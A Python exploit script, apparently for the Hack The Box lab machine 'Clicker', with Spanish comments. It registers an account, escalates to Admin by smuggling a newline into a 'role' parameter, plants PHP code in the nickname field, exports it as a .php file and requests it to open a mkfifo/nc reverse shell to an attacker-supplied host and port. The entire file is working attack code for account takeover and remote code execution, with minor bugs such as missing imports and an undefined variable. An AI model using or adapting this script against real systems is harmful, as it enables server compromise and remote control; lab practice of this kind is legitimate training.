import requests
import re
import requests as req
import argparse
import rich
from pwn import *
from urllib.parse import quote

parser = argparse.ArgumentParser()
parser.add_argument("-lhost", help="Local IP for reverse shell", required=True)
parser.add_argument("-lport", help="Local port for reverse shell", required=True)

args = parser.parse_args()
lhost = args.lhost
lport = args.lport

longitud = 10
cadena_aleatoria = ''.join(random.choices(string.ascii_letters + string.digits, k=longitud))
print(cadena_aleatoria)

register_data = {
    'username': cadena_aleatoria,
    'password': '123123'
}

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"}
# Registrar una cuenta
try:
    s = req.Session()
    register_url = "http://clicker.htb/create_player.php"
    # Crear cuenta
    p = s.post(url=register_url, data=register_data, headers=headers)
    if p.status_code == 200 and "Successfully registered" in p.text:
        rich.print("[green][+] Cuenta creada con éxito[/green]")
        p2 = s.post("http://clicker.htb/authenticate.php", data=register_data)

        # Generar el payload
        payload = f"<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f\"); ?>"
        payload_urlEncoded = quote(payload)

        # Convertir el usuario en administrador y escribir el payload
        g = s.get("http://clicker.htb/save_game.php?clicks=0&level=0&role%0a=Admin")
        g2 = s.get("http://clicker.htb/logout.php")
        p3 = s.post("http://clicker.htb/authenticate.php", data=register_data)
        g3 = s.get(f"http://clicker.htb/save_game.php?clicks=0&level=0&Nickname={payload_urlEncoded}")
        # Escribir el payload
        payload_data = {
            'threshold': '1000000',
            'extension': 'php'
        }
        p4 = s.post(url="http://clicker.htb/export.php",
                    data=payload_data,
                    headers=headers)
        print(p4.text)
        if p4.status_code == 200:
            rich.print("[green][+] Archivo subido correctamente[/green]")
            patron = re.compile(r'top_players\w*')
            archivo = patron.search(p4.text)
            if archivo:
                archivo = archivo.group()
                g6 = s.get(f"http://clicker.htb/exports/{archivo}.php")


    elif "User already exists" in r.text:
        rich.print("[yellow][!] Ya existe dicho usuario [/yellow]")
    else:
        rich.print("[red][-] Error durante la creación de cuenta[/red]")
except:
    rich.print("[red][!] Error en la request[/red]")
